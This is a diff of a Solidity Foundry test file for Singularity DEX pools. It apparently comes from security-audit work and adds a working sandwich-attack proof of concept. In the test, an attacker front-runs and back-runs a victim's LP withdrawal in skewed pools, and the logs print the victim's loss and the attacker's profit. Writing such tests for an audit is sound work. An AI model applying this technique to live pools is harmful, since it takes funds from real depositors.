@@ -1,17 +1,17 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "forge-std/Test.sol";
-import "contracts/SingularityPool.sol";
-import "contracts/SingularityOracle.sol";
-import "contracts/SingularityFactory.sol";
-import "contracts/SingularityRouter.sol";
-import "contracts/testing/TestChainlinkFeed.sol";
-import "contracts/testing/TestERC20.sol";
-import "contracts/testing/TestWFTM.sol";
+import {Test} from "forge-std/Test.sol";
+import "forge-std/console.sol";
+import {SingularityPool} from "contracts/SingularityPool.sol";
+import {SingularityOracle} from "contracts/SingularityOracle.sol";
+import {SingularityFactory} from "contracts/SingularityFactory.sol";
+import {SingularityRouter} from "contracts/SingularityRouter.sol";
+import {TestChainlinkFeed} from "contracts/testing/TestChainlinkFeed.sol";
+import {TestERC20} from "contracts/testing/TestERC20.sol";
+import {WFTM} from "contracts/testing/TestWFTM.sol";
 
 contract ContractTest is Test {
-
     WFTM public wftm;
     TestERC20 public eth;
     TestERC20 public usdc;
@@ -19,12 +19,12 @@ contract ContractTest is Test {
 
     SingularityOracle public oracle;
     SingularityFactory public factory;
-    SingularityRouter public  router;
+    SingularityRouter public router;
 
     SingularityPool public wftmPool;
     SingularityPool public ethPool;
     SingularityPool public usdcPool;
-    // SingularityPool daiPool;
+    SingularityPool public daiPool;
 
     TestChainlinkFeed public wftmFeed;
     TestChainlinkFeed public ethFeed;
@@ -33,52 +33,61 @@ contract ContractTest is Test {
 
     // fee receiver
     address otherAddr = genAddr("otherAddr");
+    address constant attacker = address(0xbadd00d);
+    address constant victim = address(0xb0ffed);
+
+    address[] public assetArray;
+    uint256[] public priceArray;
+    uint256[] public initialQtyFactorArray;
 
     function setUp() public {
-
         // deploy test tokens
         wftm = new WFTM();
+        vm.deal(address(this), 10_000_000 ether);
+        wftm.deposit{value: 10_000_000 ether}();
+
         eth = new TestERC20("Ethereum", "ETH", 18);
-        eth.mint(address(this), 100000 * (10 ** eth.decimals()));
+        eth.mint(address(this), 10_000_000 * (10**eth.decimals()));
 
         usdc = new TestERC20("USC Coin", "USDC", 6);
-        usdc.mint(address(this), 100000 * (10 ** usdc.decimals()));
+        usdc.mint(address(this), 10_000_000 * (10**usdc.decimals()));
 
-        dai = new TestERC20("Dai Stablecoin", "DAI", 21);
-        dai.mint(address(this), 100000 * (10 ** dai.decimals()));
+        dai = new TestERC20("Dai Stablecoin", "DAI", 18);
+        dai.mint(address(this), 10_000_000 * (10**dai.decimals()));
 
         // deploy oracle
         oracle = new SingularityOracle(address(this));
         oracle.setPusher(address(this), true);
+        oracle.setOnlyUseChainlink(true);
 
-        address[] memory assetArray = new address[](4);
-        assetArray[0] = address(wftm);
-        assetArray[1] = address(eth);
-        assetArray[2] = address(usdc);
-        assetArray[3] = address(dai);
+        assetArray.push(address(wftm));
+        assetArray.push(address(eth));
+        assetArray.push(address(usdc));
+        assetArray.push(address(dai));
 
-        uint256[] memory priceArray = new uint256[](4);
-        priceArray[0] = 2;
-        priceArray[1] = 2000;
-        priceArray[2] = 1;
-        priceArray[3] = 1;
+        priceArray.push(2);
+        priceArray.push(2000);
+        priceArray.push(1);
+        priceArray.push(1);
+
+        initialQtyFactorArray.push(1);
+        initialQtyFactorArray.push(1);
+        initialQtyFactorArray.push(2000);
+        initialQtyFactorArray.push(2000);
 
         // update prices
-        oracle.pushPrices(
-            assetArray,
-            priceArray
-        );
+        oracle.pushPrices(assetArray, priceArray);
 
-        wftmFeed = new TestChainlinkFeed(2 * (10 ** 8));
+        wftmFeed = new TestChainlinkFeed(2 * (10**8));
         oracle.setChainlinkFeed(address(wftm), address(wftmFeed));
 
-        ethFeed = new TestChainlinkFeed(2000 * (10 ** 8));
+        ethFeed = new TestChainlinkFeed(2000 * (10**8));
         oracle.setChainlinkFeed(address(eth), address(ethFeed));
 
-        usdcFeed = new TestChainlinkFeed(1 * (10 ** 8));
+        usdcFeed = new TestChainlinkFeed(1 * (10**8));
         oracle.setChainlinkFeed(address(usdc), address(usdcFeed));
 
-        daiFeed = new TestChainlinkFeed(1 * (10 ** 8));
+        daiFeed = new TestChainlinkFeed(1 * (10**8));
         oracle.setChainlinkFeed(address(dai), address(daiFeed));
 
         // deploy factory
@@ -91,90 +100,189 @@ contract ContractTest is Test {
         // create pools
         wftmPool = SingularityPool(factory.createPool(address(wftm), false, 0.0015e18));
         ethPool = SingularityPool(factory.createPool(address(eth), false, 0.0015e18));
-        usdcPool = SingularityPool(factory.createPool(address(usdc), false, 0.0004e18));
-        // daiPool = SingularityPool(factory.createPool(address(dai), false, 0.0004e18));
+        usdcPool = SingularityPool(factory.createPool(address(usdc), true, 0.0004e18));
+        daiPool = SingularityPool(factory.createPool(address(dai), true, 0.0004e18));
 
-        address[] memory assetArray1 = new address[](3);
+        address[] memory assetArray1 = new address[](4);
         assetArray1[0] = address(wftm);
         assetArray1[1] = address(eth);
         assetArray1[2] = address(usdc);
+        assetArray1[3] = address(dai);
 
-        uint256[] memory capArray = new uint256[](3);
+        uint256[] memory capArray = new uint256[](4);
         capArray[0] = type(uint256).max;
         capArray[1] = type(uint256).max;
         capArray[2] = type(uint256).max;
+        capArray[3] = type(uint256).max;
 
         // set deposit caps
-        factory.setDepositCaps(
-            assetArray1,
-            capArray
-        );
-        // approve pools
-        wftm.approve(address(wftmPool), type(uint256).max);
-        eth.approve(address(ethPool), type(uint256).max);
-        usdc.approve(address(usdcPool), type(uint256).max);
+        factory.setDepositCaps(assetArray1, capArray);
 
-        // approve router
-        wftm.approve(address(router), type(uint256).max);
-        eth.approve(address(router), type(uint256).max);
-        usdc.approve(address(router), type(uint256).max);
-        dai.approve(address(router), type(uint256).max);
+        // approvals
+        for (uint x; x < assetArray.length; ++x) {
+            address asset = assetArray[x];
+            TestERC20(asset).approve(factory.getPool(asset), type(uint256).max);
+            TestERC20(asset).approve(address(router), type(uint256).max);
 
-        wftmPool.approve(address(router), type(uint256).max);
-        ethPool.approve(address(router), type(uint256).max);
-        usdcPool.approve(address(router), type(uint256).max);
+            vm.startPrank(attacker);
+            TestERC20(asset).approve(factory.getPool(asset), type(uint256).max);
+            TestERC20(asset).approve(address(router), type(uint256).max);
+            vm.stopPrank();
+
+            vm.startPrank(victim);
+            TestERC20(asset).approve(factory.getPool(asset), type(uint256).max);
+            TestERC20(asset).approve(address(router), type(uint256).max);
+            vm.stopPrank();
+        }
+
+        // load pools with assets
+        _loadPools();
     }
 
     function genAddr(bytes memory str) internal pure returns (address) {
         return address(bytes20(keccak256(str)));
     }
 
-    function testCorrectViewReturnValues() public {
-        assertEq(factory.tranche(), "Tranche A");
+    function _loadPools() public {
+        // preload pools w 1000 tokens each -- 995 from address(this) and 5 from victim
+        uint256 length = factory.allPoolsLength();
+        for (uint256 x; x < length; ++x) {
+            SingularityPool pool = SingularityPool(factory.allPools(x));
+            // console.log(address(pool));
+            TestERC20 token = TestERC20(pool.token());
+            pool.deposit(900 * initialQtyFactorArray[x] * 10**token.decimals(), address(this));
+            pool.deposit(100 * initialQtyFactorArray[x] * 10**token.decimals(), address(victim));
+        }
     }
 
-    function testDepositSandwich() public {
-        ethPool.deposit(10e18, address(this));
-
-        console.log("deposit fee", ethPool.getDepositFee(100e18));
-        console.log("pre g", ethPool._getG(ethPool.getCollateralizationRatio()));
-
-        (uint256 _assets, uint256 _liabilities) = ethPool.getAssetsAndLiabilities();
-        console.log("post g", ethPool._calcCollatalizationRatio(_assets+100e18, _liabilities+100e18));
-
-        eth.transfer(otherAddr, 1e18);
-        vm.startPrank(otherAddr);
-        eth.approve(address(ethPool), type(uint).max);
-        ethPool.deposit(1e18, otherAddr);
-        vm.stopPrank();
-
-        // ethPool.withdraw(1000, address(this));
-        console.log(eth.balanceOf(address(this)));
-        console.log(ethPool.protocolFees());
+    function _setAssets(address addr, uint256 newAssets) public {
+        // storage slot 12 => assets
+        vm.store(address(addr), bytes32(uint256(12)), bytes32(newAssets));
     }
 
-    function testSandwichZoom() public {
-        // two pools
-        // set up an eth pool of cRatio = 0.43
-        // liabilities in the pool = 100eth
-        // assets = 43 eth
-        // large withdraw 5 eth on a hugely undercollaterized pool of eth
-        // how can an attacker benefit here?
-        // swap -> out : eth, in : usdc (overcollaterized)
-        // pre-attack: usdc(undercollaterized) -> eth
-        // post-attack: eth -> dai (overcollaterized)
+    function _setLiabilities(address addr, uint256 newLiabilities) public {
+        // storage slot 13 => liabilities
+        vm.store(address(addr), bytes32(uint256(13)), bytes32(newLiabilities));
+    }
 
-        // withdraw || withdraw || deposit
-        // swap || deposit || swap
+    function _displayViewReturnValues() public {
+        uint256 length = factory.allPoolsLength();
+        for (uint256 x; x < length; ++x) {
+            SingularityPool pool = SingularityPool(factory.allPools(x));
+            TestERC20 token = TestERC20(pool.token());
+            console.log(token.symbol());
+            console.log("assets", pool.assets() / 10**token.decimals());
+            console.log("liabilities", pool.liabilities() / 10**token.decimals());
+            console.log("getPricePerShare", pool.getPricePerShare());
+            console.log("getCollateralizationRatio", pool.getCollateralizationRatio());
+            console.log("");
+        }
+        // adjust
+    }
+
+    // function testDepositSandwich() public {
+    //     ethPool.deposit(10e18, address(this));
+
+    //     console.log("deposit fee", ethPool.getDepositFee(100e18));
+    //     console.log("pre g", ethPool._getG(ethPool.getCollateralizationRatio()));
+
+    //     (uint256 _assets, uint256 _liabilities) = ethPool.getAssetsAndLiabilities();
+    //     console.log("post g", ethPool._calcCollatalizationRatio(_assets + 100e18, _liabilities + 100e18));
+
+    //     eth.transfer(otherAddr, 1e18);
+    //     vm.startPrank(otherAddr);
+    //     eth.approve(address(ethPool), type(uint256).max);
+    //     ethPool.deposit(1e18, otherAddr);
+    //     vm.stopPrank();
+
+    //     // ethPool.withdraw(1000, address(this));
+    //     console.log(eth.balanceOf(address(this)));
+    //     console.log(ethPool.protocolFees());
+    // }
+
+    // function testSandwichZoom() public {
+    //     // two pools
+    //     // set up an eth pool of cRatio = 0.43
+    //     // liabilities in the pool = 100eth
+    //     // assets = 43 eth
+    //     // large withdraw 5 eth on a hugely undercollaterized pool of eth
+    //     // how can an attacker benefit here?
+    //     // swap -> out : eth, in : usdc (overcollaterized)
+    //     // pre-attack: usdc(undercollaterized) -> eth
+    //     // post-attack: eth -> dai (overcollaterized)
+    //     // withdraw || withdraw || deposit
+    //     // swap || deposit || swap
+    // }
+
+
+    // "Normal" collateralization ratios for reference
+    // uint256 constant public newEthAssets = 1000 * 1e18;
+    // uint256 constant public newDaiAssets = 1000 * 2000 * 1e18;
+
+    uint256 constant public newEthAssets = 500 * 1e18;
+    uint256 constant public newDaiAssets = 500 * 2000 * 1e18;
+
+    function _tweakCollateralizationRatios() public {
+        _setAssets(address(ethPool), newEthAssets);
+        _setAssets(address(daiPool), newDaiAssets);
+
+        _displayViewReturnValues();
     }
 
     function testNormalWithdraw() public {
-        // two pools
-        // user deposits 5 eth
-        // set up an eth pool of cRatio = 0.43
-        // liabilities in the pool = 100eth
-        // assets = 43 eth
-        // user withdraws 5 eth
-        // check how much eth is actually withdrawn
+        _tweakCollateralizationRatios();
+
+        console.log("eth balance of victim before withdraw", eth.balanceOf(victim));
+        assertEq(eth.balanceOf(victim), 0);
+        uint256 lpBalance = ethPool.balanceOf(victim);
+        vm.prank(victim);
+        ethPool.withdraw(lpBalance, victim);
+        console.log("eth balance of victim after withdraw", eth.balanceOf(victim) / 1e18);
+
+        assertEq(eth.balanceOf(victim), 89942297439575197000); // 5 tokens - fees
+    }
+
+    function testSandwichAttack() public {
+        _tweakCollateralizationRatios();
+
+        dai.mint(attacker, 200_000 * 1e18);
+
+        console.log("");
+        console.log("before front run attacker eth", eth.balanceOf(address(attacker)) / 1e18);
+        console.log("before front run attacker dai", dai.balanceOf(address(attacker)) / 1e18);
+
+        // front run
+        vm.prank(attacker);
+        console.log("attacker front runs, swaps 200_000 dai for eth");
+        router.swapExactTokensForTokens(address(dai), address(eth), 200_000 * 1e18, 0, attacker, type(uint256).max);
+        console.log("after front run attacker eth", eth.balanceOf(address(attacker)) / 1e18);
+        console.log("after front run attacker dai", dai.balanceOf(address(attacker)) / 1e18);
+
+        console.log("new collateralization ratios");
+        _displayViewReturnValues();
+
+        uint256 lpBalance = ethPool.balanceOf(victim);
+        vm.prank(victim);
+        ethPool.withdraw(lpBalance, victim);
+        console.log("victim withdraws", eth.balanceOf(victim) / 1e18);
+        console.log("(without sandwich, victim could have withdrawn)", uint(89942297439575197000) / 1e18);
+
+        //back run
+        console.log("attacker back runs, swaps all eth for usdc (usdc is overcolatteralized pool)");
+        console.log("before back run attacker eth", eth.balanceOf(address(attacker)) / 1e18);
+
+        vm.startPrank(attacker);
+        router.swapExactTokensForTokens(
+            address(eth),
+            address(usdc),
+            eth.balanceOf(address(attacker)),
+            0,
+            attacker,
+            type(uint256).max
+        );
+
+        console.log("after back run attacker eth", eth.balanceOf(address(attacker)) / 1e18);
+        console.log("after back run attacker usdc", usdc.balanceOf(address(attacker)) / 1e6);
+        console.log("profit: ", usdc.balanceOf(address(attacker)) / 1e6 - 200000);
     }
 }
